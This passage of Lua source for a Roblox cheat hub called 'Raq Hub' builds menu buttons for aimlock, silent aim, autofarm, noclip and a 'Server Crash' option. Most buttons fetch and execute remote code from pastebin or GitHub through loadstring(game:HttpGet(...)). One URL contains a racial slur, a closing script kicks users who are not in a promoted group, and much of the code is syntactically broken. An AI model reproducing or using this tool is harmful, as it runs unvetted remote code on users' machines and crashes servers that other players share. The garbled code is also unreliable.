		localplayer.Character.Humanoid.PlatformStand=false
		speed=10
	end
	e1=mouse.KeyDown:connect(function(key)
		if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
		if key=="w" then
			keys.w=true
		elseif key=="s" then
			keys.s=true
		elseif key=="a" then
			keys.a=true
		elseif key=="d" then
			keys.d=true
		elseif key=="x" then
			if flying==true then
				flying=false
			else
				flying=true
				start()
			end
		end
	end)
	e2=mouse.KeyUp:connect(function(key)
		if key=="w" then
			keys.w=false
		elseif key=="s" then
			keys.s=false
		elseif key=="a" then
			keys.a=false
		elseif key=="d" then
			keys.d=false
		end
	end)
	start()
end)

FOV.Name = "FOV"
FOV.Parent = ButtonsMain
FOV.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FOV.BackgroundTransparency = 1.000
FOV.Position = UDim2.new(0, 0, 0.108082019, 0)
FOV.Size = UDim2.new(0, 217, 0, 38)
FOV.Font = Enum.Font.GothamBold
FOV.Text = "FOV"
FOV.TextColor3 = Color3.fromRGB(0, 0, 0)
FOV.TextSize = 30.000
FOV.MouseButton1Down:connect(function)
    game.Workspace.CurrentCamera.FieldOfView  = 200

Noclip.Name = "Noclip"
Noclip.Parent = ButtonsMain
Noclip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Noclip.BackgroundTransparency = 1.000
Noclip.Position = UDim2.new(0.52202642, 0, 0.0120035838, 0)
Noclip.Size = UDim2.new(0, 217, 0, 38)
Noclip.Font = Enum.Font.GothamBold
Noclip.Text = "Noclip [C]"
Noclip.TextColor3 = Color3.fromRGB(0, 0, 0)
Noclip.TextSize = 30.000
Noclip.MouseButton1Down:onnect(function)
loadstring(game:HttpGet('https://pastebin.com/raw/1Ax1bQ5Z'))()
end)

Aimlock.Name = "Aimlock"
Aimlock.Parent = ButtonsMain
Aimlock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Aimlock.BackgroundTransparency = 1.000
Aimlock.Position = UDim2.new(0.51762116, 0, 0.108082019, 0)
Aimlock.Size = UDim2.new(0, 217, 0, 38)
Aimlock.Font = Enum.Font.GothamBold
Aimlock.Text = "Aimlock"
Aimlock.TextColor3 = Color3.fromRGB(0, 0, 0)
Aimlock.TextSize = 30.000
Aimlock.MouseButton1Down:onnect(function)
https://pastebin.com/raw/h0BYcGTP

Godblock.Name = "Godblock"
Godblock.Parent = ButtonsMain
Godblock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Godblock.BackgroundTransparency = 1.000
Godblock.Position = UDim2.new(0, 0, 0.206121236, 0)
Godblock.Size = UDim2.new(0, 217, 0, 38)
Godblock.Font = Enum.Font.GothamBold
Godblock.Text = "God Block"
Godblock.TextColor3 = Color3.fromRGB(0, 0, 0)
Godblock.TextSize = 30.000
Godblock.MouseButton1Down:connect(function)
loadstring(game:HttpGet('https://pastebin.com/raw/8dYyXr7n'))()

Autofarm.Name = "Autofarm"
Autofarm.Parent = ButtonsMain
Autofarm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Autofarm.BackgroundTransparency = 1.000
Autofarm.Position = UDim2.new(0.51762116, 0, 0.206121236, 0)
Autofarm.Size = UDim2.new(0, 217, 0, 38)
Autofarm.Font = Enum.Font.GothamBold
Autofarm.Text = "Autofarm"
Autofarm.TextColor3 = Color3.fromRGB(0, 0, 0)
Autofarm.TextSize = 30.000
Autofarm.MouseButton1Down:connect(function)
	loadstring(game:HttpGet("https://pastebin.com/raw/74VJ07iY", true))()

BOOSTFPS.Name = "BOOSTFPS"
BOOSTFPS.Parent = ButtonsMain
BOOSTFPS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BOOSTFPS.BackgroundTransparency = 1.000
BOOSTFPS.Position = UDim2.new(0, 0, 0.298278093, 0)
BOOSTFPS.Size = UDim2.new(0, 217, 0, 38)
BOOSTFPS.Font = Enum.Font.GothamBold
BOOSTFPS.Text = "FPS Boost"
BOOSTFPS.TextColor3 = Color3.fromRGB(0, 0, 0)
BOOSTFPS.TextSize = 30.000
BOOSTFPS.MouseButton1Down:connect(function)
		local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
		local g = game
		local w = g.Workspace
		local l = g.Lighting
		local t = w.Terrain
		t.WaterWaveSize = 0
		t.WaterWaveSpeed = 0
		t.WaterReflectance = 0
		t.WaterTransparency = 0
		l.GlobalShadows = false
		l.FogEnd = 9e9
		l.Brightness = 0
		settings().Rendering.QualityLevel = "Level01"
		for i, v in pairs(g:GetDescendants()) do
			if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
				v.Material = "Plastic"
				v.Reflectance = 0
			elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
				v.Transparency = 1
			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
				v.Lifetime = NumberRange.new(0)
			elseif v:IsA("Explosion") then
				v.BlastPressure = 1
				v.BlastRadius = 1
			elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
				v.Enabled = false
			elseif v:IsA("MeshPart") then
				v.Material = "Plastic"
				v.Reflectance = 0
				v.TextureID = 10385902758728957
			end
		end
		for i, e in pairs(l:GetChildren()) do
			if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
				e.Enabled = false
			end
		end		

CrashServer.Name = "CrashServer"
CrashServer.Parent = ButtonsMain
CrashServer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CrashServer.BackgroundTransparency = 1.000
CrashServer.Position = UDim2.new(0.52422905, 0, 0.302199662, 0)
CrashServer.Size = UDim2.new(0, 217, 0, 38)
CrashServer.Font = Enum.Font.GothamBold
CrashServer.Text = "Server Crash"
CrashServer.TextColor3 = Color3.fromRGB(0, 0, 0)
CrashServer.TextSize = 30.000
		loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))() 

Autodrop.Name = "Autodrop"
Autodrop.Parent = ButtonsMain
Autodrop.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Autodrop.BackgroundTransparency = 1.000
Autodrop.Position = UDim2.new(0, 0, 0.396317303, 0)
Autodrop.Size = UDim2.new(0, 217, 0, 38)
Autodrop.Font = Enum.Font.GothamBold
Autodrop.Text = "Autodrop"
Autodrop.TextColor3 = Color3.fromRGB(0, 0, 0)
Autodrop.TextSize = 30.000
Autodrop.MouseButton1Down:connect(function)
		loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop"), true))()

FistReach.Name = "Fist Reach"
FistReach.Parent = ButtonsMain
FistReach.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FistReach.BackgroundTransparency = 1.000
FistReach.Position = UDim2.new(0.52422905, 0, 0.394356519, 0)
FistReach.Size = UDim2.new(0, 217, 0, 38)
FistReach.Font = Enum.Font.GothamBold
FistReach.Text = "Fist Reach"
FistReach.TextColor3 = Color3.fromRGB(0, 0, 0)
FistReach.TextSize = 30.000
FistReach.MouseButton1Down:connect(function)		
	loadstring(game:HttpGet('https://pastebin.com/raw/aZHK690D'))()
end)

KittenAssist.Name = "KittenAssist"
KittenAssist.Parent = ButtonsMain
KittenAssist.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KittenAssist.BackgroundTransparency = 1.000
KittenAssist.Position = UDim2.new(0, 0, 0.490434945, 0)
KittenAssist.Size = UDim2.new(0, 217, 0, 38)
KittenAssist.Font = Enum.Font.GothamBold
KittenAssist.Text = "Kitten Assist"
KittenAssist.TextColor3 = Color3.fromRGB(0, 0, 0)
KittenAssist.TextSize = 30.000
KittenAssist.MouseButton1Down:connect(function)
loadstring(game:HttpGet('https://pastebin.com/raw/LBdfVH6c'))()

SilentAim.Name = "SilentAim"
SilentAim.Parent = ButtonsMain
SilentAim.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SilentAim.BackgroundTransparency = 1.000
SilentAim.Position = UDim2.new(0.51762116, 0, 0.490434945, 0)
SilentAim.Size = UDim2.new(0, 217, 0, 38)
SilentAim.Font = Enum.Font.GothamBold
SilentAim.Text = "Silent Aim"
SilentAim.TextColor3 = Color3.fromRGB(0, 0, 0)
SilentAim.TextSize = 30.000
SilentAim.MouseButton1Down:connect(function)
	loadstring(game:HttpGet('https://pastebin.com/raw/R4pkLE8M'))()

ModFly.Name = "ModFly"
ModFly.Parent = ButtonsMain
ModFly.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ModFly.BackgroundTransparency = 1.000
ModFly.Position = UDim2.new(0, 0, 0.582591832, 0)
ModFly.Size = UDim2.new(0, 217, 0, 38)
ModFly.Font = Enum.Font.GothamBold
ModFly.Text = "Mod Fly [X]"
ModFly.TextColor3 = Color3.fromRGB(0, 0, 0)
ModFly.TextSize = 30.000
ModFly.MouseButton1Down:connect(function)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/DaHoodScripts/Shitty-nigger-get-cracked/main/w"))()

Freecam.Name = "Freecam"
Freecam.Parent = ButtonsMain
Freecam.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Freecam.BackgroundTransparency = 1.000
Freecam.Position = UDim2.new(0.51762116, 0, 0.582591832, 0)
Freecam.Size = UDim2.new(0, 217, 0, 38)
Freecam.Font = Enum.Font.GothamBold
Freecam.Text = "Freecam"
Freecam.TextColor3 = Color3.fromRGB(0, 0, 0)
Freecam.TextSize = 30.000
Freecam.MouseButton1Down:connect(function)
			loadstring(game:HttpGet("https://pastebin.com/raw/yJ51HKy9"))()

Btools.Name = "Btools"
Btools.Parent = ButtonsMain
Btools.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Btools.BackgroundTransparency = 1.000
Btools.Position = UDim2.new(-0.00220263004, 0, 0.676709473, 0)
Btools.Size = UDim2.new(0, 217, 0, 38)
Btools.Font = Enum.Font.GothamBold
Btools.Text = "Btools"
Btools.TextColor3 = Color3.fromRGB(0, 0, 0)
Btools.TextSize = 30.000
Btools.MouseButton1Down:connect(function)
				loadstring(game:HttpGet("https://pastebin.com/raw/7B6rpudb"))()

AnimChanger.Name = "AnimChanger"
AnimChanger.Parent = ButtonsMain
AnimChanger.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AnimChanger.BackgroundTransparency = 1.000
AnimChanger.Position = UDim2.new(0.52202642, 0, 0.676709473, 0)
AnimChanger.Size = UDim2.new(0, 217, 0, 38)
AnimChanger.Font = Enum.Font.GothamBold
AnimChanger.Text = "Animation changer"
AnimChanger.TextColor3 = Color3.fromRGB(0, 0, 0)
AnimChanger.TextScaled = true
AnimChanger.TextSize = 30.000
AnimChanger.TextWrapped = true
AnimChanger.MouseButton1Down:connect(function)
					loadstring(game:HttpGet("https://pastebin.com/raw/FKAPc6Vf"))()

InfJump.Name = "InfJump"
InfJump.Parent = ButtonsMain
InfJump.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfJump.BackgroundTransparency = 1.000
InfJump.Position = UDim2.new(-0.00220263004, 0, 0.766905606, 0)
InfJump.Size = UDim2.new(0, 217, 0, 38)
InfJump.Font = Enum.Font.GothamBold
InfJump.Text = "Inf Jump"
InfJump.TextColor3 = Color3.fromRGB(0, 0, 0)
InfJump.TextSize = 30.000
InfJump.MouseButton1Down:connect(function)
						loadstring(game:HttpGet("https://pastebin.com/raw/TXLwy6Gy"))()

TeleportUi.Name = "TeleportUi"
TeleportUi.Parent = ButtonsMain
TeleportUi.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TeleportUi.BackgroundTransparency = 1.000
TeleportUi.Position = UDim2.new(0.524229109, 0, 0.764944792, 0)
TeleportUi.Size = UDim2.new(0, 217, 0, 38)
TeleportUi.Font = Enum.Font.GothamBold
TeleportUi.Text = "Teleport UI"
TeleportUi.TextColor3 = Color3.fromRGB(0, 0, 0)
TeleportUi.TextSize = 30.000
TeleportUi.MouseButton1Down:connect(function)
							loadstring(game:HttpGet("https://pastebin.com/raw/AfHEMpyH"))()

TeleportUi_2.Name = "TeleportUi"
TeleportUi_2.Parent = ButtonsMain
TeleportUi_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TeleportUi_2.BackgroundTransparency = 1.000
TeleportUi_2.Position = UDim2.new(5.96046448e-08, 0, 0.857101679, 0)
TeleportUi_2.Size = UDim2.new(0, 217, 0, 38)
TeleportUi_2.Font = Enum.Font.GothamBold
TeleportUi_2.Text = "Teleport UI"
TeleportUi_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TeleportUi_2.TextSize = 30.000

Close_2.Name = "Close"
Close_2.Parent = ButtonsMain
Close_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close_2.BackgroundTransparency = 1.000
Close_2.Position = UDim2.new(0.522026479, 0, 0.857101679, 0)
Close_2.Size = UDim2.new(0, 217, 0, 38)
Close_2.Font = Enum.Font.GothamBold
Close_2.Text = "Destroy UI"
Close_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Close_2.TextSize = 30.000

-- Scripts:

local function CADHTPL_fake_script() -- Close.CloseGuiButtonScript 
	local script = Instance.new('Script', Close)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(CADHTPL_fake_script)()
local function PSBO_fake_script() -- Loading_2.Handler 
	local script = Instance.new('LocalScript', Loading_2)

	script.Parent.Text = "Loading"
	wait(.5)
	script.Parent.Text = "Loading."
	wait(.5)
	script.Parent.Text = "Loading.."
	wait(.5)
	script.Parent.Text = "Loading..."
	wait(.5)
	script.Parent.Text = "Loaded!"
	wait(.5)
	script.Parent.Text = "Checking game"
	wait(1)
	script.Parent.Text = "Checking game."
	wait(1)
	script.Parent.Text = "Checking game.."
	wait(1)
	script.Parent.Text = "Checking game..."
	wait(1.5)
	script.Parent.Text = "Done!"
	wait(1)
	script.Parent.Parent.Visible = false
end
coroutine.wrap(PSBO_fake_script)()
local function REPTFRX_fake_script() -- Loading.Drag 
	local script = Instance.new('LocalScript', Loading)

	
	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	dragify(script.Parent)
end
coroutine.wrap(REPTFRX_fake_script)()
local function OTOK_fake_script() -- Main.Drag 
	local script = Instance.new('LocalScript', Main)

	
	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	dragify(script.Parent)
end
coroutine.wrap(OTOK_fake_script)()
local function UMFYDM_fake_script() -- Main.Vis 
	local script = Instance.new('LocalScript', Main)

	wait(8)
	script.Parent.Visible = true
end
coroutine.wrap(UMFYDM_fake_script)()
local function WVNE_fake_script() -- RaqHub.Notification Script 
	local script = Instance.new('LocalScript', RaqHub)

	--put this in starterplayerscripts or startergui
	wait(8)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Raq Hub"; --must be string
		Text = "Copy discord?"; --must be string
		Icon = ""; --optional
		Duration = 999999999999; -- defaults to 5 secs if no duration is set
		Button1 = "Copy";
	})
end
coroutine.wrap(WVNE_fake_script)()
local function IXDLUQ_fake_script() -- RaqHub.Notification Script 
	local script = Instance.new('LocalScript', RaqHub)

	--put this in starterplayerscripts or startergui
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Raq Hub"; --must be string
		Text = "Loading..."; --must be string
		Icon = ""; --optional
		Duration = 3; -- defaults to 5 secs if no duration is set
	})
end
coroutine.wrap(IXDLUQ_fake_script)()
local function VAFQJLO_fake_script() -- RaqHub.CopyScript 
	local script = Instance.new('LocalScript', RaqHub)

	setclipboard("https://www.roblox.com/groups/10611145/rqazaas-fan-club#!/about")
end
coroutine.wrap(VAFQJLO_fake_script)()
local function RFKFV_fake_script() -- RaqHub.GroupWhitelist 
	local script = Instance.new('Script', RaqHub)

	local groupid = 10611145
	local noob = game.Players.LocalPlayer
	if noob:IsInGroup(groupid) then                    
		print ""
	else
		print ""
		noob:Kick("Join the group copied to your clipboard.")  
	end
end
coroutine.wrap(RFKFV_fake_script)()
